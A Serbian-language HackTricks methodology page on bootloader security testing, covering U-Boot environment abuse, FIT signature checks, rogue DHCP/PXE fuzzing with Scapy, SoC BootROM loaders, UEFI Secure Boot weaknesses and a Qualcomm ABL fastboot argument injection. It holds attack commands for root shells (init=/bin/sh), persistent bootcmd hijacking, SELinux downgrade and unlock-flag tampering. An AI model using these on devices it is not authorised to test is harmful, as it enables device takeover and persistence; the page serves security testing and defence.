# Testiranje bootloadera

{{#include ../../banners/hacktricks-training.md}}

Preporučuju se sledeći koraci za izmene konfiguracija pokretanja uređaja i testiranje bootloadera kao što su U-Boot i UEFI-class loaderi. Fokusirajte se na dobijanje izvršavanja koda u ranoj fazi, procenu zaštita od provere potpisa i rollback-a, kao i na zloupotrebu recovery ili network-boot putanja.

Povezano: MediaTek secure-boot bypass putem patchovanja bl2_ext:

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

## Brze U-Boot pobede i zloupotreba okruženja

1. Pristup interpreter shell-u
- Tokom boot-a pritisnite poznati taster za prekid (često bilo koji taster, 0, razmak ili sekvencu specifičnu za ploču) pre izvršavanja `bootcmd` da biste dospeli do U-Boot prompta.<sup>[[1]](#references)</sup>

2. Proverite stanje boot-a i promenljive
- Korisne komande:
- `printenv` (ispis okruženja)
- `bdinfo` (informacije o ploči i memorijskim adresama)
- `help bootm; help booti; help bootz` (podržane metode za bootovanje kernela)
- `help ext4load; help fatload; help tftpboot` (dostupni loaderi)

3. Izmenite boot argumente da biste dobili root shell
- Dodajte `init=/bin/sh` kako bi kernel otvorio shell umesto uobičajenog init procesa:
```
# printenv
# setenv bootargs 'console=ttyS0,115200 root=/dev/mtdblock3 rootfstype=<fstype> init=/bin/sh'
# saveenv
# boot    # or: run bootcmd
```

4. Netboot sa vašeg TFTP servera
- Konfigurišite mrežu i preuzmite kernel/fit image sa LAN-a:
```
# setenv ipaddr 192.168.2.2      # device IP
# setenv serverip 192.168.2.1    # TFTP server IP
# saveenv; reset
# ping ${serverip}
# tftpboot ${loadaddr} zImage           # kernel
# tftpboot ${fdt_addr_r} devicetree.dtb # DTB
# setenv bootargs "${bootargs} init=/bin/sh"
# booti ${loadaddr} - ${fdt_addr_r}
```

5. Sačuvajte izmene putem okruženja
- Ako storage za env nije zaštićen od upisa, možete trajno zadržati kontrolu:
```
# setenv bootcmd 'tftpboot ${loadaddr} fit.itb; bootm ${loadaddr}'
# saveenv
```
- Proverite promenljive kao što su `bootcount`, `bootlimit`, `altbootcmd` i `boot_targets`, koje utiču na fallback putanje. Pogrešno konfigurisane vrednosti mogu omogućiti ponovljene prekide i ulaske u shell.

6. Proverite debug/unsafe funkcije
- Potražite: `bootdelay` > 0, onemogućen `autoboot`, neograničen `usb start; fatload usb 0:1 ...`, mogućnost korišćenja `loady`/`loads` putem serijske veze, `env import` sa nepouzdanog medija i kernele/ramdisk-ove koji se učitavaju bez provere potpisa.

7. Testiranje U-Boot image/verification funkcionalnosti
- Ako platforma tvrdi da koristi secure/verified boot sa FIT image-ima, pokušajte i sa unsigned i sa tampered image-ima:
```
# tftpboot ${loadaddr} fit-unsigned.itb; bootm ${loadaddr}     # should FAIL if FIT sig enforced
# tftpboot ${loadaddr} fit-signed-badhash.itb; bootm ${loadaddr} # should FAIL
# tftpboot ${loadaddr} fit-signed.itb; bootm ${loadaddr}        # should only boot if key trusted
```
- Odsustvo `CONFIG_FIT_SIGNATURE`/`CONFIG_(SPL_)FIT_SIGNATURE` ili ponašanje starijeg `verify=n` često omogućava bootovanje proizvoljnih payload-a.
- Nemojte se zaustaviti na jednostavnom rezultatu allow/deny: novija FIT istraživanja pokazala su da sam verification path može biti pre-auth attack surface. Negativno testirajte eksterno sačuvane FIT podatke (`data-offset`, `data-position`, `data-size`), izbor potpisane konfiguracije, `loadables` i obradu overlay / `extra-conf` elemenata.
- Ako imate odgovarajuće source stablo, `test/vboot/vboot_test.sh` je brz način za reprodukciju ponašanja FIT verification-a u U-Boot sandbox-u pre testiranja stvarnog hardware-a.<sup>[[10]](#references)</sup>

8. Standard Boot (`bootstd`), `extlinux` i script bootflows
- Na modernim U-Boot build-ovima, `bootcmd` je često samo wrapper oko Standard Boot-a. To znači da writable media, PXE ili SPI flash mogu postati stvarna trust boundary čak i kada vidljivo okruženje izgleda bezopasno.
- `extlinux` bootmeth traži `extlinux/extlinux.conf` pod `/` i `/boot`; script bootmeth prvo traži `boot.scr.uimg`, a zatim `boot.scr`. Kod network boot-a, naziv skripte može poticati iz `boot_script_dhcp`.
- Korisne triage komande:
```
# bootflow scan -l
# bootflow list
# bootflow select 0; bootflow info -d
# bootmeth list
# bootmeth order "extlinux script pxe"
```
- Slučajevi zloupotrebe koje treba testirati: attacker-controlled USB/SD media ranije u `boot_targets`, writable `/boot/extlinux/extlinux.conf`, rogue TFTP koji dostavlja `boot.scr` ili izvršavanje SPI-backed skripte putem `script_offset_f`.
- Ako se platforma oslanja na FIT verification, proverite da li su konfiguracije potpisane na nivou konfiguracije, a ne samo po image-u; `required-mode=all` je jači od prihvatanja bilo kog pojedinačnog required key-a.

## Network-boot površina (DHCP/PXE) i rogue serveri

9. Fuzzing PXE/DHCP parametara
- U-Boot-ov legacy BOOTP/DHCP handling imao je probleme sa memory safety. Na primer, CVE‑2024‑42040 opisuje memory disclosure putem posebno kreiranih DHCP odgovora, koji mogu da leak-uju bajtove iz U-Boot memorije nazad preko mreže.<sup>[[4]](#references)</sup> Testirajte DHCP/PXE code paths sa predugačkim vrednostima i vrednostima na granicama (option 67 bootfile-name, vendor options, file/servername polja) i pratite hang-ove/leak-ove.
- Minimalni Scapy snippet za opterećivanje boot parametara tokom netboot-a:
```python
from scapy.all import *
offer = (Ether(dst='ff:ff:ff:ff:ff:ff')/
IP(src='192.168.2.1', dst='255.255.255.255')/
UDP(sport=67, dport=68)/
BOOTP(op=2, yiaddr='192.168.2.2', siaddr='192.168.2.1', chaddr=b'\xaa\xbb\xcc\xdd\xee\xff')/
DHCP(options=[('message-type','offer'),
('server_id','192.168.2.1'),
# Intentionally oversized and strange values
('bootfile_name','A'*300),
('vendor_class_id','B'*240),
'end']))
sendp(offer, iface='eth0', loop=1, inter=0.2)
```
- Takođe proverite da li se PXE filename polja prosleđuju shell/loader logici bez sanitizacije kada se lančano povežu sa provisioning skriptama na nivou OS-a.

10. Testiranje command injection-a putem rogue DHCP servera
- Postavite rogue DHCP/PXE servis i pokušajte da ubacite karaktere u filename ili options polja kako biste došli do command interpreter-a u kasnijim fazama boot chain-a. Metasploit DHCP auxiliary, `dnsmasq` ili prilagođene Scapy skripte dobro funkcionišu. Pre toga obavezno izolujte lab mrežu.

## SoC ROM recovery režimi koji zaobilaze normalni boot

Mnogi SoC-ovi izlažu BootROM "loader" režim koji prihvata kod putem USB/UART-a čak i kada su flash image-i nevažeći. Ako secure-boot fuse-ovi nisu aktivirani, ovo može omogućiti proizvoljno izvršavanje koda veoma rano u chain-u.

- NXP i.MX (Serial Download Mode)
- Alati: `uuu` (mfgtools3) ili `imx-usb-loader`.
- Primer: `imx-usb-loader u-boot.imx` za slanje i pokretanje prilagođenog U-Boot-a iz RAM-a.
- Allwinner (FEL)
- Alat: `sunxi-fel`.
- Primer: `sunxi-fel -v uboot u-boot-sunxi-with-spl.bin` ili `sunxi-fel write 0x4A000000 u-boot-sunxi-with-spl.bin; sunxi-fel exe 0x4A000000`.
- Rockchip (MaskROM)
- Alat: `rkdeveloptool`.
- Primer: `rkdeveloptool db loader.bin; rkdeveloptool ul u-boot.bin` za učitavanje loader-a i upload prilagođenog U-Boot-a.

Procenite da li uređaj ima aktivirane secure-boot eFuse/OTP vrednosti. Ako nema, BootROM download režimi često zaobilaze bilo kakvu verifikaciju višeg nivoa (U-Boot, kernel, rootfs) tako što direktno izvršavaju vaš first-stage payload iz SRAM/DRAM memorije.

## UEFI/PC-class bootloaderi: brze provere

11. Testiranje ESP tampering-a, rollback-a i enrollment-a ključeva
- Mount-ujte EFI System Partition (ESP) i proverite loader komponente: `EFI/Microsoft/Boot/bootmgfw.efi`, `EFI/BOOT/BOOTX64.efi`, `EFI/ubuntu/shimx64.efi`, `grubx64.efi` i putanje do logo-a proizvođača.
- Ispišite Secure Boot stanje i key database iz OS-a kada je moguće:
```bash
mokutil --sb-state
efi-readvar -v PK
efi-readvar -v KEK
efi-readvar -v db
efi-readvar -v dbx
```
- Ako je platforma u Setup Mode-u, prihvata unauthenticated key enrollment ili se isporučuje sa testnim/podrazumevanim Platform Key-em (PKfail klasa), lokalni administrator ili fizički attacker može da upiše sopstveni KEK/db i da Secure Boot i dalje izgleda “enabled” dok se boot-uju proizvoljni EFI binariji.<sup>[[3]](#references)</sup>
- Pokušajte bootovanje sa downgraded ili poznato ranjivim potpisanim boot komponentama ako Secure Boot revocations (dbx) nisu ažurne. Ako platforma i dalje veruje starim shim-ovima/bootmanager-ima, često možete učitati sopstveni kernel ili `grub.cfg` sa ESP-a radi persistence-a.

12. Testiranje zastarelog shim-a / SBAT / dbx revocation-a
- Stari Microsoft-signed shim-ovi i fork-ovi proizvođača i dalje mogu služiti kao BYOVD-style bootkit putanja ako su revocations zastarele. U izolovanom lab-u postavite istorijski ranjiv shim na ESP i pokušajte da chainload-ujete sopstveni `grubx64.efi` ili kernel.<sup>[[11]](#references)</sup>
- Brzi triage:
```bash
sbverify --list shimx64.efi
objdump -s -j .sbat shimx64.efi | less
efibootmgr -v
```
- Ako shim i dalje radi uprkos tome što se nalazi na revocation listi, firmware/OS ima zastarele `dbx` updates ili veruje fork-ovanom loader-u koji nikada nije nasledio upstream SBAT zaštite.

13. Greške u parsiranju boot logo-a (LogoFAIL klasa)
- Nekoliko OEM/IBV firmware-a bilo je ranjivo na image-parsing propuste u DXE-u koji obrađuju boot logo-e. Ako attacker može da postavi posebno kreiran image na ESP pod putanjom specifičnom za proizvođača (npr. `\EFI\<vendor>\logo\*.bmp`) i izvrši reboot, moguće je izvršavanje koda tokom ranog boot-a čak i kada je Secure Boot omogućen. Testirajte da li platforma prihvata logo-e koje obezbeđuje korisnik i da li su te putanje writable iz OS-a.<sup>[[2]](#references)</sup>


## Android/Qualcomm ABL + GBL (Android 16) trust gaps

Na Android 16 uređajima koji koriste Qualcomm-ov ABL za učitavanje **Generic Bootloader Library (GBL)**, proverite da li ABL **autentifikuje** UEFI app koji učitava sa `efisp` particije. Ako ABL proverava samo **prisustvo** UEFI app-a i ne verifikuje potpise, write primitive prema `efisp` postaje **pre-OS unsigned code execution** tokom boot-a.<sup>[[6]](#references)[[7]](#references)</sup>

Praktične provere i abuse paths:

- **efisp write primitive**: Potreban vam je način da upišete prilagođeni UEFI app u `efisp` (root/privileged servis, propust u OEM app-u, recovery/fastboot putanja). Bez toga, GBL loading gap nije direktno dostižan.<sup>[[6]](#references)</sup>
- **fastboot OEM argument injection** (ABL bug): Neki build-ovi prihvataju dodatne tokene u `fastboot oem set-gpu-preemption` i dodaju ih u kernel cmdline. Ovo se može koristiti za forsiranje permissive SELinux-a, čime se omogućava upis u zaštićene particije:
```bash
fastboot oem set-gpu-preemption 0 androidboot.selinux=permissive
```
Ako je uređaj patchovan, komanda bi trebalo da odbije dodatne argumente.<sup>[[5]](#references)[[6]](#references)</sup>
- **Bootloader unlock putem persistent flags**: Payload u boot fazi može promeniti persistent unlock flags (npr. `is_unlocked=1`, `is_unlocked_critical=1`) kako bi emulirao `fastboot oem unlock` bez OEM server/approval gate-ova. Ovo je trajna promena stanja nakon sledećeg reboot-a.<sup>[[6]](#references)</sup>

Defensive/triage napomene:

- Potvrdite da li ABL vrši signature verification GBL/UEFI payload-a iz `efisp` particije. Ako ne, tretirajte `efisp` kao high-risk persistence surface.
- Pratite da li su ABL fastboot OEM handler-i patchovani tako da **validiraju broj argumenata** i odbijaju dodatne tokene.<sup>[[8]](#references)[[9]](#references)</sup>

## Oprez pri radu sa hardware-om

Budite oprezni pri radu sa SPI/NAND flash-om tokom ranog boot-a (npr. uzemljenje pinova radi zaobilaženja čitanja) i uvek konsultujte datasheet za flash. Kratki spojevi u pogrešnom trenutku mogu oštetiti uređaj ili programmer.

## Napomene i dodatni saveti

- Isprobajte `env export -t ${loadaddr}` i `env import -t ${loadaddr}` za premeštanje environment blob-ova između RAM-a i storage-a; neke platforme omogućavaju import env-a sa removable media bez autentifikacije.
- Za persistence na Linux-based sistemima koji se boot-uju putem `extlinux.conf`, izmena `APPEND` linije (radi ubacivanja `init=/bin/sh` ili `rd.break`) na boot particiji često je dovoljna kada se ne sprovode provere potpisa.
- Ako cilj koristi dual-slot / A/B updates, pregledajte anti-rollback i slot-desync tehnike u [firmware analysis overview](README.md) kako ne biste propustili trust gaps koji postoje samo u updater-u, izvan samog bootloadera.
- Ako userland obezbeđuje `fw_printenv/fw_setenv`, proverite da li `/etc/fw_env.config` odgovara stvarnom env storage-u. Pogrešno podešeni offset-i omogućavaju čitanje/upis u pogrešan MTD region.

## Reference

- [1] [Firmware Security Testing Methodology](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [2] [Finding LogoFAIL: The dangers of image parsing during system boot](https://www.binarly.io/blog/finding-logofail-the-dangers-of-image-parsing-during-system-boot)
- [3] [PKfail: Untrusted Platform Keys Undermine Secure Boot on UEFI Ecosystem](https://www.binarly.io/blog/pkfail-untrusted-platform-keys-undermine-secure-boot-on-uefi-ecosystem)
- [4] [CVE-2024-42040 Detail](https://nvd.nist.gov/vuln/detail/CVE-2024-42040)
- [5] [Preempted: Unlocking Xiaomi via two unsanitized strings](https://bestwing.me/preempted-unlocking-xiaomi-via-two-unsanitized-strings.html)
- [6] [Qualcomm Snapdragon 8 Elite GBL exploit lets attackers unlock bootloaders](https://www.androidauthority.com/qualcomm-snapdragon-8-elite-gbl-exploit-bootloader-unlock-3648651/)
- [7] [Generic Bootloader (GBL) architecture](https://source.android.com/docs/core/architecture/bootloader/generic-bootloader)
- [8] [QcomModulePkg: Fix propagation of untrusted input into kernel cmdline](https://git.codelinaro.org/clo/la/abl/tianocore/edk2/-/commit/f09c2fe3d6c42660587460e31be50c18c8c777ab)
- [9] [QcomModulePkg: add check for set-hw-fence-value command](https://git.codelinaro.org/clo/la/abl/tianocore/edk2/-/commit/78297e8cfe091fc59c42fc33d3490e2008910fe2)
- [10] [Unfit to boot: breaking U-Boot's FIT signature verification](https://www.binarly.io/blog/unfit-to-boot-breaking-u-boots-fit-signature-verification)
- [11] [Vulnerability Note VU#616257 - Microsoft-signed UEFI shim bootloaders vulnerable to Secure Boot bypass](https://kb.cert.org/vuls/id/616257)

{{#include ../../banners/hacktricks-training.md}}
